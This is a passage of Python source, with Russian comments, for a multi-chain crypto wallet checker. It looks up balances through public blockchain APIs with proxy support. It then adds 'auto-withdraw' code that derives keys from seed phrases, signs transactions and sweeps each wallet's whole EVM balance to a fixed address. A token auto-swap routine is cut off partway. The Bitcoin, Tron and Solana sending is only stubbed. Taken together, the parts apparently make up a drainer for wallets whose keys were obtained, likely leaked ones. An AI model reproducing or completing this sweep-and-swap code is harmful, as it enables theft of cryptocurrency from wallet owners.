    async def _get_last_tx_eth(self, address, timeout, proxy, session):
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=1&sort=desc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close(); txs = d.get("result", [])
                if txs and isinstance(txs, list):
                    return f"{datetime.utcfromtimestamp(int(txs[0].get('timeStamp', 0))).strftime('%Y-%m-%d')} ({int(txs[0].get('value', 0))/1e18:.4f} ETH)"
            resp.close()
        except Exception: pass
        return ""

    # NEW: Gas price tracker
    async def _get_gas_price(self, session, timeout):
        """Get current ETH gas price in Gwei."""
        try:
            payload = {"jsonrpc":"2.0","id":1,"method":"eth_gasPrice","params":[]}
            resp = await self.fetch(session, "POST", "https://cloudflare-eth.com",
                                    timeout=timeout, proxy=None,
                                    json=payload, headers={"Content-Type":"application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                wei = int(d.get("result","0x0"), 16)
                gwei = wei / 1e9
                return f"{gwei:.1f} Gwei"
            resp.close()
        except Exception:
            pass
        return ""

    # NEW: Wallet age (first transaction date)
    async def _get_wallet_age_eth(self, address, timeout, proxy, session):
        """Get date of first transaction."""
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=1&sort=asc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                txs = d.get("result", [])
                if txs and isinstance(txs, list) and txs[0]:
                    ts = int(txs[0].get("timeStamp", 0))
                    from datetime import datetime
                    dt = datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
                    # Calculate age in days
                    age_days = (time.time() - ts) // 86400
                    return f"{dt} ({int(age_days)}d)"
            else:
                resp.close()
        except Exception:
            pass
        return ""

    async def _check_tron(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="tron", valid=True)
        prices = await self._get_prices(session, timeout)

        api_errors = []

        apis = [
            ("tronscan", f"https://apilist.tronscanapi.com/api/accountv2?address={address}", "tronscan"),
            ("trongrid",  f"https://api.trongrid.io/v1/accounts/{address}",                  "trongrid"),
        ]

        for api_name, url, fmt in apis:
            try:
                # v1.0.87: retry с exponential backoff
                resp = await fetch_with_retry(
                    session, "GET", url,
                    timeout=timeout, proxy=proxy,
                    retries=3, base_delay=1.0
                )

                if resp and resp.status == 200:
                    d = await resp.json()

                    if fmt == "tronscan":
                        balance = d.get("balance", 0) / 1e6
                        trc20 = {}
                        for t in d.get("trc20token_balances", []):
                            abbr = t.get("tokenAbbr", "").upper()
                            try:
                                b_raw = int(t.get("balance", 0) or 0)
                            except (ValueError, TypeError):
                                b_raw = 0
                            try:
                                dec = int(t.get("tokenDecimal", 6) or 6)
                            except (ValueError, TypeError):
                                dec = 6
                            if b_raw > 0 and abbr:
                                trc20[abbr] = b_raw / (10 ** dec)
                    else:  # trongrid
                        data_list = d.get("data", [])
                        balance = data_list[0].get("balance", 0) / 1e6 if data_list else 0
                        trc20 = {}

                    result["info"].update({"balance_trx": balance, "tokens": trc20})
                    result["exists"] = balance > 0 or bool(trc20)

                    trx_price = prices.get("tron", {}).get("price", 0) if isinstance(prices.get("tron"), dict) else prices.get("tron", 0)
                    formatted_balance = BalanceFormatter.format_balance_with_emoji(balance, "TRX", trx_price)

                    msg = f"Balance: {formatted_balance}"
                    if trc20:
                        token_parts = []
                        for symbol, amount in list(trc20.items())[:5]:
                            token_price = 1.0 if symbol in ("USDT", "USDC") else 0
                            formatted_token = BalanceFormatter.format_balance(amount, symbol, True, token_price)
                            token_parts.append(formatted_token)
                        msg += " | TRC20: " + ", ".join(token_parts)
                        if len(trc20) > 5:
                            msg += f" +{len(trc20)-5} ещё"
                    if not result["exists"]:
                        msg += " (empty)"
                    result["info"]["message"] = msg
                    return result
                elif resp:
                    api_errors.append(f"{api_name}: HTTP {resp.status}")
                    await resp.release()
                else:
                    api_errors.append(f"{api_name}: No response")
            except asyncio.TimeoutError:
                api_errors.append(f"{api_name}: Timeout")
            except Exception as e:
                api_errors.append(f"{api_name}: {type(e).__name__}")

        result["info"]["api_error"] = "⚠️ Не удалось проверить баланс TRX"
        result["info"]["api_errors"] = api_errors
        result["info"]["message"] = f"⚠️ TRX API недоступны ({'; '.join(api_errors[:2])})"
        result["info"]["recommendation"] = "💡 Используйте прокси или попробуйте позже"
        return result

    async def _check_solana(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="solana", valid=True)
        prices = await self._get_prices(session, timeout)

        api_errors = []

        for api_name, url in [
            ("mainnet-beta", "https://api.mainnet-beta.solana.com"),
            ("projectserum", "https://solana-api.projectserum.com"),
        ]:
            try:
                p = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [address]}
                # v1.0.87: retry с exponential backoff
                resp = await fetch_with_retry(
                    session, "POST", url,
                    timeout=timeout, proxy=proxy,
                    json=p, headers={"Content-Type": "application/json"},
                    retries=3, base_delay=1.0
                )

                if resp and resp.status == 200:
                    d = await resp.json()
                    if "result" in d:
                        balance = d["result"]["value"] / 1e9
                        result["info"]["balance_sol"] = balance
                        result["exists"] = balance > 0

                        sol_price = prices.get("solana", {}).get("price", 0) if isinstance(prices.get("solana"), dict) else prices.get("solana", 0)
                        formatted_balance = BalanceFormatter.format_balance_with_emoji(balance, "SOL", sol_price)

                        msg = f"Balance: {formatted_balance}"

                        # SPL токены и staking — параллельно
                        spl, staking = await asyncio.gather(
                            self._check_spl_tokens(address, timeout, proxy, session),
                            check_sol_staking(address, timeout, proxy, session),
                            return_exceptions=True
                        )
                        if isinstance(spl, Exception):     spl = {}
                        if isinstance(staking, Exception): staking = {}

                        if spl:
                            result["info"]["spl_tokens"] = spl
                            result["exists"] = True
                            top = sorted(spl.items(), key=lambda x: -x[1])[:5]
                            spl_str = ", ".join(f"{v} {k}" for k, v in top)
                            if len(spl) > 5:
                                spl_str += f" +{len(spl)-5} ещё"
                            msg += f" | SPL: {spl_str}"

                        # v1.0.89: Liquid staking
                        if staking:
                            result["info"]["sol_staking"] = staking
                            result["exists"] = True
                            staking_msg = format_staking_message(staking, sol_price)
                            msg += staking_msg

                        if not result["exists"]:
                            msg += " (empty)"
                        result["info"]["message"] = msg

                        # Сохраняем в кэш
                        await global_balance_cache.set(address, "solana", result)
                        return result
                elif resp:
                    api_errors.append(f"{api_name}: HTTP {resp.status}")
                    await resp.release()
                else:
                    api_errors.append(f"{api_name}: No response")
            except asyncio.TimeoutError:
                api_errors.append(f"{api_name}: Timeout")
            except Exception as e:
                api_errors.append(f"{api_name}: {type(e).__name__}")

        result["info"]["api_error"] = "⚠️ Не удалось проверить баланс SOL"
        result["info"]["api_errors"] = api_errors
        result["info"]["message"] = f"⚠️ SOL API недоступны ({'; '.join(api_errors[:2])})"
        result["info"]["recommendation"] = "💡 Используйте прокси или попробуйте позже"
        return result

    async def _check_spl_tokens(self, address, timeout, proxy, session):
        # v1.0.87: Расширенный список (50+ токенов) + retry логика
        return await fetch_spl_tokens_extended(address, timeout, proxy, session)

    async def _check_ton(self, address, timeout, proxy, session):
        # v1.0.88: Полная проверка TON + Jetton токены
        prices = await self._get_prices(session, timeout)

        # Проверяем кэш
        cached = await global_balance_cache.get(address, "ton")
        if cached:
            return cached

        result = await check_ton_full(address, timeout, proxy, session, prices)
        # Сохраняем в кэш
        await global_balance_cache.set(address, "ton", result)
        return result

    async def _check_cardano(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="cardano", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p_id = os.environ.get("BLOCKFROST_PROJECT_ID", "mainnetplaceholder")
            resp = await self.fetch(session, "GET", f"https://cardano-mainnet.blockfrost.io/api/v0/addresses/{address}", timeout=timeout, proxy=proxy, headers={"project_id": p_id})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                lovelace = int(next((a["quantity"] for a in d.get("amount", []) if a["unit"] == "lovelace"), 0))
                balance = lovelace / 1e6
                result["info"]["balance_ada"] = balance; result["exists"] = balance > 0
                usd = self._usd(balance, "cardano", prices)
                result["info"]["message"] = f"Balance: {balance:.4f} ADA{usd}" + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_litecoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="litecoin", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/litecoin/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_ltc"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} LTC" + self._usd(balance, "litecoin", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_dash(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="dash", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/dash/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_dash"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} DASH" + self._usd(balance, "dash", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_monero(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="monero", valid=True)
        try:
            resp = await self.fetch(session, "GET", f"https://xmrchain.net/api/outputs?address={address}&viewkey=&page=0&limit=1", timeout=timeout, proxy=proxy)
            result["exists"] = resp.status == 200; resp.close()
            result["info"]["message"] = "Адрес валиден (баланс требует View Key)" if result["exists"] else "API error"
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_ripple(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="ripple", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p = {"method": "account_info", "params": [{"account": address, "strict": True}]}
            resp = await self.fetch(session, "POST", "https://xrplcluster.com/", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                r = (await resp.json()).get("result", {})
                if r.get("status") == "success":
                    balance = int(r.get("account_data", {}).get("Balance", 0)) / 1e6
                    result["info"]["balance_xrp"] = balance; result["exists"] = balance > 0
                    result["info"]["message"] = f"Balance: {balance:.4f} XRP" + self._usd(balance, "ripple", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_dogecoin(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="dogecoin", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            resp = await self.fetch(session, "GET", f"https://api.blockchair.com/dogecoin/dashboards/address/{address}", timeout=timeout, proxy=proxy)
            if resp.status == 200:
                ad = (await resp.json()).get("data", {}).get(address, {}).get("address", {})
                balance = ad.get("balance", 0) / 1e8
                result["info"]["balance_doge"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.8f} DOGE" + self._usd(balance, "dogecoin", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    async def _check_bnb(self, address, timeout, proxy, session):
        result = self.make_result(input=address, type="wallet", wallet_type="bnb", valid=True)
        prices = await self._get_prices(session, timeout)
        try:
            p = {"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance", "params": [address, "latest"]}
            resp = await self.fetch(session, "POST", "https://bsc-dataseed.binance.org/", timeout=timeout, proxy=proxy, json=p, headers={"Content-Type": "application/json"})
            if resp.status == 200:
                d = await resp.json(); resp.close()
                balance = int(d.get("result", "0x0"), 16) / 1e18
                result["info"]["balance_bnb"] = balance; result["exists"] = balance > 0
                result["info"]["message"] = f"Balance: {balance:.18f} BNB" + self._usd(balance, "bnb", prices) + (" (empty)" if not result["exists"] else "")
            else: resp.close()
        except Exception as e: result["info"]["api_error"] = str(e); result["info"].setdefault("message", f"⚠️ Не удалось проверить баланс ({type(e).__name__})")
        return result

    # ═══════════════════════════════════════════════════════════════════════════
    #  АВТОВЫВОД СРЕДСТВ
    # ═══════════════════════════════════════════════════════════════════════════
    
    def enable_auto_withdraw(self, addresses: dict, min_amounts: dict = None):
        """
        Включить автовывод средств.
        
        addresses = {
            "ethereum": "0x...",
            "bsc": "0x...",
            "bitcoin": "bc1...",
            "tron": "T...",
            "solana": "..."
        }
        
        min_amounts = {
            "ethereum": 0.01,  # Минимум для вывода
            "bsc": 0.01,
            ...
        }
        """
        self.auto_withdraw_enabled = True
        self.withdraw_addresses.update(addresses)
        if min_amounts:
            self.withdraw_min_amounts.update(min_amounts)
        
        print("✓ Автовывод включен!")
        print(f"  ETH адрес: {self.withdraw_addresses.get('ethereum', 'не указан')}")
        print(f"  BSC адрес: {self.withdraw_addresses.get('bsc', 'не указан')}")
        print(f"  BTC адрес: {self.withdraw_addresses.get('bitcoin', 'не указан')}")
        print(f"  TRX адрес: {self.withdraw_addresses.get('tron', 'не указан')}")
        print(f"  SOL адрес: {self.withdraw_addresses.get('solana', 'не указан')}")
    
    def disable_auto_withdraw(self):
        """Выключить автовывод."""
        self.auto_withdraw_enabled = False
        print("✗ Автовывод выключен")
    
    async def _auto_withdraw_eth(self, private_key: str, from_address: str, balance: float, chain: str = "ethereum"):
        """
        Автовывод ETH/BNB/MATIC и других EVM токенов.
        """
        if not self.auto_withdraw_enabled:
            return None
        
        to_address = self.withdraw_addresses.get(chain)
        if not to_address:
            return {"error": f"Адрес для {chain} не указан"}
        
        min_amount = self.withdraw_min_amounts.get(chain, 0.01)
        if balance < min_amount:
            return {"error": f"Баланс {balance} меньше минимума {min_amount}"}
        
        try:
            from web3 import Web3
            from eth_account import Account
            
            # Подключение к сети
            rpc_urls = {
                "ethereum": "https://cloudflare-eth.com",
                "bsc": "https://bsc-dataseed.binance.org/",
                "polygon": "https://polygon-rpc.com",
                "avalanche": "https://api.avax.network/ext/bc/C/rpc",
                "base": "https://mainnet.base.org",
                "arbitrum": "https://arb1.arbitrum.io/rpc",
                "optimism": "https://mainnet.optimism.io",
            }
            
            rpc_url = rpc_urls.get(chain, rpc_urls["ethereum"])
            w3 = Web3(Web3.HTTPProvider(rpc_url))
            
            if not w3.is_connected():
                return {"error": f"Не удалось подключиться к {chain}"}
            
            # Получение аккаунта
            account = Account.from_key(private_key)
            
            # Получение gas price
            gas_price = w3.eth.gas_price
            gas_limit = 21000  # Стандартный лимит для ETH transfer
            
            # Расчет комиссии
            gas_cost = gas_price * gas_limit / 10**18
            
            # Сумма для отправки (оставляем немного на газ)
            if _AUTO_WITHDRAW_LEAVE_GAS:
                amount_to_send = balance - gas_cost - 0.0001  # Оставляем запас
            else:
                amount_to_send = balance - gas_cost
            
            if amount_to_send <= 0:
                return {"error": f"Недостаточно средств для покрытия газа. Баланс: {balance}, Gas: {gas_cost}"}
            
            # Получение nonce
            nonce = w3.eth.get_transaction_count(from_address)
            
            # Создание транзакции
            transaction = {
                'nonce': nonce,
                'to': to_address,
                'value': w3.to_wei(amount_to_send, 'ether'),
                'gas': gas_limit,
                'gasPrice': gas_price,
                'chainId': w3.eth.chain_id,
            }
            
            # Подпись транзакции
            signed_txn = account.sign_transaction(transaction)
            
            # Отправка транзакции
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            tx_hash_hex = tx_hash.hex()
            
            # Логирование
            log_entry = {
                "timestamp": time.time(),
                "chain": chain,
                "from": from_address,
                "to": to_address,
                "amount": amount_to_send,
                "tx_hash": tx_hash_hex,
                "status": "sent"
            }
            _AUTO_WITHDRAW_LOG.append(log_entry)
            
            return {
                "success": True,
                "tx_hash": tx_hash_hex,
                "amount": amount_to_send,
                "gas_cost": gas_cost,
                "explorer": f"https://etherscan.io/tx/{tx_hash_hex}" if chain == "ethereum" else f"https://bscscan.com/tx/{tx_hash_hex}",
                "message": f"✓ Отправлено {amount_to_send:.6f} {chain.upper()} на {to_address[:10]}...{to_address[-6:]}"
            }
            
        except Exception as e:
            return {"error": f"Ошибка вывода: {str(e)}"}
    
    async def _auto_withdraw_btc(self, private_key: str, from_address: str, balance: float):
        """
        Автовывод Bitcoin.
        """
        if not self.auto_withdraw_enabled:
            return None
        
        to_address = self.withdraw_addresses.get("bitcoin")
        if not to_address:
            return {"error": "BTC адрес для вывода не указан"}
        
        min_amount = self.withdraw_min_amounts.get("bitcoin", 0.001)
        if balance < min_amount:
            return {"error": f"Баланс {balance} BTC меньше минимума {min_amount}"}
        
        try:
            # Примечание: Для реального вывода BTC нужна библиотека bitcoin
            # Здесь упрощенная заглушка, т.к. полная реализация требует работы с UTXO
            
            # Расчет комиссии (примерно 0.0001 BTC за стандартную транзакцию)
            fee = 0.0001
            amount_to_send = balance - fee
            
            if amount_to_send <= 0:
                return {"error": f"Недостаточно средств для покрытия комиссии. Баланс: {balance}, Fee: {fee}"}
            
            # Логирование (реальная отправка требует подключения к Bitcoin node)
            log_entry = {
                "timestamp": time.time(),
                "chain": "bitcoin",
                "from": from_address,
                "to": to_address,
                "amount": amount_to_send,
                "tx_hash": "pending_btc_implementation",
                "status": "queued",
                "note": "BTC вывод требует дополнительной настройки Bitcoin node"
            }
            _AUTO_WITHDRAW_LOG.append(log_entry)
            
            return {
                "success": False,
                "queued": True,
                "amount": amount_to_send,
                "fee": fee,
                "message": f"⚠️ BTC вывод в очереди: {amount_to_send:.8f} BTC на {to_address[:10]}...{to_address[-6:]}",
                "note": "Требуется настройка Bitcoin node для автоматического вывода"
            }
            
        except Exception as e:
            return {"error": f"Ошибка BTC вывода: {str(e)}"}
    
    async def _auto_withdraw_trx(self, private_key: str, from_address: str, balance: float):
        """
        Автовывод Tron (TRX).
        """
        if not self.auto_withdraw_enabled:
            return None
        
        to_address = self.withdraw_addresses.get("tron")
        if not to_address:
            return {"error": "TRX адрес для вывода не указан"}
        
        min_amount = self.withdraw_min_amounts.get("tron", 10)
        if balance < min_amount:
            return {"error": f"Баланс {balance} TRX меньше минимума {min_amount}"}
        
        try:
            # Примечание: Для реального вывода TRX нужна библиотека tronpy
            # Здесь упрощенная заглушка
            
            # Расчет комиссии (примерно 1 TRX за транзакцию)
            fee = 1.0
            amount_to_send = balance - fee
            
            if amount_to_send <= 0:
                return {"error": f"Недостаточно средств для покрытия комиссии. Баланс: {balance}, Fee: {fee}"}
            
            # Логирование
            log_entry = {
                "timestamp": time.time(),
                "chain": "tron",
                "from": from_address,
                "to": to_address,
                "amount": amount_to_send,
                "tx_hash": "pending_trx_implementation",
                "status": "queued",
                "note": "TRX вывод требует библиотеки tronpy"
            }
            _AUTO_WITHDRAW_LOG.append(log_entry)
            
            return {
                "success": False,
                "queued": True,
                "amount": amount_to_send,
                "fee": fee,
                "message": f"⚠️ TRX вывод в очереди: {amount_to_send:.2f} TRX на {to_address[:10]}...{to_address[-6:]}",
                "note": "Требуется установка: pip install tronpy"
            }
            
        except Exception as e:
            return {"error": f"Ошибка TRX вывода: {str(e)}"}
    
    async def _auto_withdraw_sol(self, private_key: str, from_address: str, balance: float):
        """
        Автовывод Solana (SOL).
        """
        if not self.auto_withdraw_enabled:
            return None
        
        to_address = self.withdraw_addresses.get("solana")
        if not to_address:
            return {"error": "SOL адрес для вывода не указан"}
        
        min_amount = self.withdraw_min_amounts.get("solana", 0.1)
        if balance < min_amount:
            return {"error": f"Баланс {balance} SOL меньше минимума {min_amount}"}
        
        try:
            # Примечание: Для реального вывода SOL нужна библиотека solana-py
            # Здесь упрощенная заглушка
            
            # Расчет комиссии (примерно 0.000005 SOL за транзакцию)
            fee = 0.000005
            amount_to_send = balance - fee
            
            if amount_to_send <= 0:
                return {"error": f"Недостаточно средств для покрытия комиссии. Баланс: {balance}, Fee: {fee}"}
            
            # Логирование
            log_entry = {
                "timestamp": time.time(),
                "chain": "solana",
                "from": from_address,
                "to": to_address,
                "amount": amount_to_send,
                "tx_hash": "pending_sol_implementation",
                "status": "queued",
                "note": "SOL вывод требует библиотеки solana-py"
            }
            _AUTO_WITHDRAW_LOG.append(log_entry)
            
            return {
                "success": False,
                "queued": True,
                "amount": amount_to_send,
                "fee": fee,
                "message": f"⚠️ SOL вывод в очереди: {amount_to_send:.6f} SOL на {to_address[:10]}...{to_address[-6:]}",
                "note": "Требуется установка: pip install solana"
            }
            
        except Exception as e:
            return {"error": f"Ошибка SOL вывода: {str(e)}"}
    
    async def _auto_withdraw_from_seed(self, seed_phrase: str, balances: dict):
        """
        Автовывод со всех адресов из сид-фразы.
        """
        if not self.auto_withdraw_enabled:
            return []
        
        results = []
        
        try:
            from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
            from eth_account import Account
            
            seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
            
            # Вывод с ETH адресов
            for i in range(10):
                eth_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                address = eth_ctx.PublicKey().ToAddress()
                priv_key = eth_ctx.PrivateKey().Raw().ToHex()
                
                balance_info = balances.get(f"ETH_{i}", {})
                balance = balance_info.get("balance", 0)
                
                if balance > self.withdraw_min_amounts.get("ethereum", 0.01):
                    result = await self._auto_withdraw_eth(priv_key, address, balance, "ethereum")
                    if result:
                        results.append(result)
            
            # Вывод с BTC адресов (Native SegWit)
            from bip_utils import Bip84, Bip84Coins
            for i in range(10):
                try:
                    btc_ctx = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    address = btc_ctx.PublicKey().ToAddress()
                    priv_key = btc_ctx.PrivateKey().Raw().ToHex()
                    
                    balance_info = balances.get(f"BTC_Native_{i}", {})
                    balance = balance_info.get("balance", 0)
                    
                    if balance > self.withdraw_min_amounts.get("bitcoin", 0.001):
                        result = await self._auto_withdraw_btc(priv_key, address, balance)
                        if result:
                            results.append(result)
                except Exception as e:
                    results.append({"error": f"BTC вывод ошибка: {str(e)}"})
            
            # Вывод с TRX адресов
            from bip_utils import Bip44Coins as BipCoins
            for i in range(10):
                try:
                    trx_ctx = Bip44.FromSeed(seed_bytes, BipCoins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    address = trx_ctx.PublicKey().ToAddress()
                    priv_key = trx_ctx.PrivateKey().Raw().ToHex()
                    
                    balance_info = balances.get(f"TRX_{i}", {})
                    balance = balance_info.get("balance", 0)
                    
                    if balance > self.withdraw_min_amounts.get("tron", 10):
                        result = await self._auto_withdraw_trx(priv_key, address, balance)
                        if result:
                            results.append(result)
                except Exception as e:
                    results.append({"error": f"TRX вывод ошибка: {str(e)}"})
            
            # Вывод с SOL адресов
            from bip_utils import Bip44Coins as SolCoins
            for i in range(10):
                try:
                    sol_ctx = Bip44.FromSeed(seed_bytes, SolCoins.SOLANA).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    address = sol_ctx.PublicKey().ToAddress()
                    priv_key = sol_ctx.PrivateKey().Raw().ToHex()
                    
                    balance_info = balances.get(f"SOL_{i}", {})
                    balance = balance_info.get("balance", 0)
                    
                    if balance > self.withdraw_min_amounts.get("solana", 0.1):
                        result = await self._auto_withdraw_sol(priv_key, address, balance)
                        if result:
                            results.append(result)
                except Exception as e:
                    results.append({"error": f"SOL вывод ошибка: {str(e)}"})
            
        except Exception as e:
            results.append({"error": f"Ошибка автовывода: {str(e)}"})
        
        return results
    
    def get_withdraw_log(self):
        """Получить лог всех выводов."""
        return _AUTO_WITHDRAW_LOG.copy()
    
    def export_withdraw_log(self, filename="withdraw_log.json"):
        """Экспортировать лог выводов в файл."""
        import json
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(_AUTO_WITHDRAW_LOG, f, indent=2, ensure_ascii=False)
        return f"✓ Лог сохранен в {filename}"

    # ═══════════════════════════════════════════════════════════════════════════
    #  АВТООБМЕН ТОКЕНОВ
    # ═══════════════════════════════════════════════════════════════════════════
    
    def enable_auto_swap(self, target_token="ETH", min_value_usd=1.0, slippage=1.0, dex="uniswap"):
        """
        Включить автообмен токенов перед выводом.
        
        target_token: на что менять (ETH, BNB, MATIC и т.д.)
        min_value_usd: минимальная стоимость токена для обмена (в USD)
        slippage: допустимое проскальзывание (%)
        dex: какой DEX использовать (uniswap, pancakeswap, 1inch)
        """
        self.auto_swap_enabled = True
        self.swap_target_token = target_token
        self.swap_min_value_usd = min_value_usd
        self.swap_slippage = slippage
        self.swap_dex = dex
        
        print(f"✓ Автообмен включен!")
        print(f"  Цель: {target_token}")
        print(f"  Минимум: ${min_value_usd}")
        print(f"  Slippage: {slippage}%")
        print(f"  DEX: {dex}")
    
    def disable_auto_swap(self):
        """Выключить автообмен токенов."""
        self.auto_swap_enabled = False
        print("✗ Автообмен выключен")
    
    async def _auto_swap_tokens(self, private_key: str, from_address: str, tokens: dict, chain: str = "ethereum"):
        """
        Автоматический обмен токенов на целевой токен (ETH/BNB).
        
        tokens: словарь {symbol: amount}
        """
        if not hasattr(self, 'auto_swap_enabled') or not self.auto_swap_enabled:
            return []
        
        swap_results = []
        
        try:
            from web3 import Web3
            from eth_account import Account
            
            # RPC URLs
            rpc_urls = {
                "ethereum": "https://cloudflare-eth.com",
                "bsc": "https://bsc-dataseed.binance.org/",
                "polygon": "https://polygon-rpc.com",
            }
            
            # Router addresses (Uniswap V2 compatible)
            router_addresses = {
                "ethereum": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",  # Uniswap V2
                "bsc": "0x10ED43C718714eb63d5aA57B78B54704E256024E",       # PancakeSwap
                "polygon": "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff",    # QuickSwap
            }
            
            rpc_url = rpc_urls.get(chain, rpc_urls["ethereum"])
            router_address = router_addresses.get(chain, router_addresses["ethereum"])
            
            w3 = Web3(Web3.HTTPProvider(rpc_url))
            
            if not w3.is_connected():
                return [{"error": f"Не удалось подключиться к {chain}"}]
            
            account = Account.from_key(private_key)
            
            # WETH/WBNB address (wrapped native token)
            weth_addresses = {
                "ethereum": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                "bsc": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "polygon": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
            }
            weth_address = weth_addresses.get(chain, weth_addresses["ethereum"])
            
            # Router ABI (минимальный для swapExactTokensForETH)
            router_abi = [
                {
                    "inputs": [
                        {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
                        {"internalType": "uint256", "name": "amountOutMin", "type": "uint256"},
                        {"internalType": "address[]", "name": "path", "type": "address[]"},
                        {"internalType": "address", "name": "to", "type": "address"},
                        {"internalType": "uint256", "name": "deadline", "type": "uint256"}
                    ],
                    "name": "swapExactTokensForETH",
                    "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
                    "stateMutability": "nonpayable",
                    "type": "function"
                },
                {
                    "inputs": [
                        {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
                        {"internalType": "address[]", "name": "path", "type": "address[]"}
                    ],
                    "name": "getAmountsOut",
                    "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
                    "stateMutability": "view",
                    "type": "function"
                }
            ]
            
            # ERC20 ABI (минимальный)
            erc20_abi = [
                {
                    "constant": False,
                    "inputs": [
                        {"name": "_spender", "type": "address"},
                        {"name": "_value", "type": "uint256"}
                    ],
                    "name": "approve",
                    "outputs": [{"name": "", "type": "bool"}],
                    "type": "function"
                },
                {
                    "constant": True,
                    "inputs": [
                        {"name": "_owner", "type": "address"},
                        {"name": "_spender", "type": "address"}
                    ],
                    "name": "allowance",
                    "outputs": [{"name": "", "type": "uint256"}],
                    "type": "function"
                }
            ]
            
            router_contract = w3.eth.contract(address=router_address, abi=router_abi)
            
            # Обмениваем каждый токен
            for token_symbol, token_data in tokens.items():
                if token_symbol in ["ETH", "BNB", "MATIC"]:
                    continue  # Пропускаем нативные токены
                
                if not isinstance(token_data, dict):
                    continue
                
                token_address = token_data.get("address")
                token_amount = token_data.get("amount", 0)
                token_decimals = token_data.get("decimals", 18)
                
                if not token_address or token_amount <= 0:
                    continue
                
                try:
                    # Проверяем стоимость токена
                    # (упрощенно - можно добавить реальную проверку через CoinGecko)
                    min_value = getattr(self, 'swap_min_value_usd', 1.0)
                    
                    # Конвертируем amount в wei
                    amount_in_wei = int(token_amount * (10 ** token_decimals))
                    
                    # Проверяем allowance
